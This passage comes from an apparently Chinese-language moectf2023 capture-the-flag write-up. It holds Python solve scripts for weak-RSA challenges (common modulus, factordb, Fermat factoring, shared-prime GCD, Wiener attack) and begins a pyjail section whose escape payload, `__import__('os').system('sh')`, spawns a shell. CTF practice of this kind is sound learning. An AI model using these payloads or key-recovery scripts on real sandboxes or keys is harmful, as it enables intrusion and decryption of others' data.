class="hljs-number">4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_def</span>(<span class="hljs-params">e1,e2,c1,c2,n</span>):<br>    s,s1,s2 = gmpy2.gcdext(e1, e2)<br>    m = (<span class="hljs-built_in">pow</span>(c1,s1,n) * <span class="hljs-built_in">pow</span>(c2 ,s2 ,n)) % n<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(m)<br><br>m=exp_def(e1,e2,c1,c2,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h3 id="factor-signin"><a href="#factor-signin" class="headerlink" title="factor_signin"></a>factor_signin</h3><p>factordb</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">p1 = <span class="hljs-number">18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741</span><br>q1 = <span class="hljs-number">19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901</span><br>n1 = <span class="hljs-number">343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641</span><br>e = <span class="hljs-number">65537</span><br>c1 = <span class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>d1 = gmpy2.invert(e,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>))<br>m1=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br><br>c2 =  <span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br>n2 =  <span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><br>n2b=[<span class="hljs-number">9949603102225364603</span>,<span class="hljs-number">10049235158029375571</span>,<span class="hljs-number">10547615587767500213</span>,<span class="hljs-number">10596280721192026229</span>,<span class="hljs-number">10864078180916418691</span>,<span class="hljs-number">11092420583960163379</span>,<span class="hljs-number">11853704782834170959</span>,<span class="hljs-number">12034779627328165471</span>,<span class="hljs-number">12404642343676224637</span>,<span class="hljs-number">12448177342966243757</span>,<span class="hljs-number">13062839684118954553</span>,<span class="hljs-number">13645878578452317313</span>,<span class="hljs-number">14397830993057803133</span>,<span class="hljs-number">14619040595108594017</span>,<span class="hljs-number">14678737767649343977</span>,<span class="hljs-number">14745811312384518031</span>,<span class="hljs-number">14813953870710226847</span>,<span class="hljs-number">15175734709842430433</span>,<span class="hljs-number">15211380502610462057</span>,<span class="hljs-number">15332916111580607077</span>,<span class="hljs-number">15751974537676958401</span>,<span class="hljs-number">16123604149048919099</span>,<span class="hljs-number">16408421615173973083</span>,<span class="hljs-number">16870346804576162551</span>,<span class="hljs-number">17093292308638969889</span>,<span class="hljs-number">17265001711647542137</span>,<span class="hljs-number">17289161209347211817</span>,<span class="hljs-number">17543713628803023199</span>,<span class="hljs-number">17673334943789572513</span>,<span class="hljs-number">18106525049998616747</span>,<span class="hljs-number">18345408081492711641</span>,<span class="hljs-number">18390046459144888243</span>]<br>phi2= <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n2b:<br>    phi2 *= (i-<span class="hljs-number">1</span>)<br>d2=gmpy2.invert(e,phi2)<br>m2=<span class="hljs-built_in">pow</span>(c2,d2,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))<br></code></pre></td></tr></table></figure><h3 id="p-q"><a href="#p-q" class="headerlink" title="|p-q|"></a>|p-q|</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span><br>n = <span class="hljs-number">329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor</span>(<span class="hljs-params">n</span>):<br>    a = gmpy2.iroot(n, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        B2 = <span class="hljs-built_in">pow</span>(a, <span class="hljs-number">2</span>) - n<br>        <span class="hljs-keyword">if</span> gmpy2.is_square(B2):<br>            b = gmpy2.iroot(B2, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>            p = a + b<br>            q = a - b<br>            <span class="hljs-keyword">return</span> p,q<br>        a += <span class="hljs-number">1</span>  <br><br><span class="hljs-comment">#print(factor(n))</span><br>p = <span class="hljs-number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661013147</span><br>q = <span class="hljs-number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661012811</span><br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="rsa-signin"><a href="#rsa-signin" class="headerlink" title="rsa_signin"></a>rsa_signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">n1 = <span class="hljs-number">17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span><br>c1 = <span class="hljs-number">6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span><br>n2 = <span class="hljs-number">24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span><br>c2 = <span class="hljs-number">10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span><br>n3 = <span class="hljs-number">14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span><br>c3 = <span class="hljs-number">415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span><br>n4 = <span class="hljs-number">12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span><br>c4 = <span class="hljs-number">2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span><br>n5 = <span class="hljs-number">18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span><br>c5 = <span class="hljs-number">2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span><br>n6 = <span class="hljs-number">22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span><br>c6 = <span class="hljs-number">12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span><br>n7 = <span class="hljs-number">19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span><br>c7 = <span class="hljs-number">9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span><br>n8 = <span class="hljs-number">16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span><br>c8 = <span class="hljs-number">16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span><br>n9 = <span class="hljs-number">16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span><br>c9 = <span class="hljs-number">11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span><br>n10 = <span class="hljs-number">13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span><br>c10 = <span class="hljs-number">6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span><br>n11 = <span class="hljs-number">21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span><br>c11 = <span class="hljs-number">6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>e=<span class="hljs-number">65537</span><br>names = <span class="hljs-built_in">locals</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):<br>      <span class="hljs-keyword">if</span> GCD(names[<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(i)],names[<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(k)])!=<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(i,k)<br>p = GCD(n3,n11)<br>q =  n3//p      <br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m=<span class="hljs-built_in">pow</span>(c3,d,n3)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br>        <br></code></pre></td></tr></table></figure><h3 id="giant-e"><a href="#giant-e" class="headerlink" title="giant_e"></a>giant_e</h3><p>维纳攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continuedFra</span>(<span class="hljs-params">x, y</span>):<br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradualFra</span>(<span class="hljs-params">cf</span>):<br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pq</span>(<span class="hljs-params">a, b, c</span>):<br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getGradualFra</span>(<span class="hljs-params">cf</span>):<br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br>n = <span class="hljs-number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span><br>e = <span class="hljs-number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span><br>c = <span class="hljs-number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span><br>d = wienerAttack(e, n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h1 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h1><h3 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h3><p>没有过滤<br><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>拿到shell<br><img src="/mdimg/moectf2023/53.png"></p><h3 id="Jail-Level-1"><a href="#Jail-Level-1" class="headerlink" title="Jail Level 